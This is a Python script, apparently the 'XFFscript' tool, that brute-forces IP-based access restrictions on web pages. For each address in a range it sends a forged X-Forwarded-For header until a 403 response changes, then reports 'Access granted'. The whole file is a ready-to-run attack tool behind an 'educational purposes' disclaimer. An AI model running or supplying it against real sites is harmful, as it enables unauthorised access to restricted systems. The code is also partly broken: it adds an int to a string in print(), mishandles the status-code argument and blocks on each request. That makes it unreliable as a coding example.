#!/usr/bin/env python3

'''
 __    __  ________  ________                              __             __
|  \  |  \|        \|        \                            |  \           |  \
| $$  | $$| $$$$$$$$| $$$$$$$$_______   _______   ______   \$$  ______  _| $$_
 \$$\/  $$| $$__    | $$__   /       \ /       \ /      \ |  \ /      \|   $$ \
  >$$  $$ | $$  \   | $$  \ |  $$$$$$$|  $$$$$$$|  $$$$$$\| $$|  $$$$$$\\$$$$$$
 /  $$$$\ | $$$$$   | $$$$$  \$$    \ | $$      | $$   \$$| $$| $$  | $$ | $$ __
|  $$ \$$\| $$      | $$     _\$$$$$$\| $$_____ | $$      | $$| $$__/ $$ | $$|  \
| $$  | $$| $$      | $$    |       $$ \$$     \| $$      | $$| $$    $$  \$$  $$
 \$$   \$$ \$$       \$$     \$$$$$$$   \$$$$$$$ \$$       \$$| $$$$$$$    \$$$$
                                                              | $$
                                                              | $$
                                                               \$$
Github: https://github.com/theodorsm/XFFscript
inspired by https://github.com/omespino/enumXFF
Author: theodorsm
Use at your own risk. Usage might be illegal in certain circumstances.
Only for educational purposes!
'''
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession
from tqdm import tqdm
import argparse
import iptools

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Restricted Page (target)", required=True)
parser.add_argument("-c", "--status_code", help="Restricted Access status code - default is 403", default=403)
parser.add_argument("-r", "--range", help="IP range i.e. 0.0.0.0-255.255.255.255", required=True)
parser.add_argument("-w", "--workers", help="Worker/thread count - default is 100", default=100)
parser.add_argument("-o", "--output", help="If an IP address returns another status code, save IP address to file", default="working_ips.txt")
args = parser.parse_args()

def main():
    print("""
###########
# Github: https://github.com/theodorsm/XFFscript
# inspired by https://github.com/omespino/enumXFF
# Author: theodorsm
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
""")
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))

    def generate_ips(ip_range):
        ip_start = ip_range.split("-")[0]
        ip_end = ip_range.split("-")[1]
        r = iptools.IpRange(ip_start, ip_end)
        return r

    ip_addresses = generate_ips(args.range)

    for ip in tqdm(ip_addresses):
        ip_list = ("{0}, ".format(ip) * 50)[:-2]
        x_forwarded_for_header = {"X-Forwarded-For" : ip_list}
        future = session.get(args.target, headers=x_forwarded_for_header)
        response = future.result()
        if response.status_code != args.status_code:
            ip_save_file = open(args.output, "a")
            ip_save_file.write(args.target + ": " + str(x_forwarded_for_header) + "\n")
            print(response.status_code + " \nAccess granted with {0}".format(ip))
            break

if __name__ == '__main__':
    main()

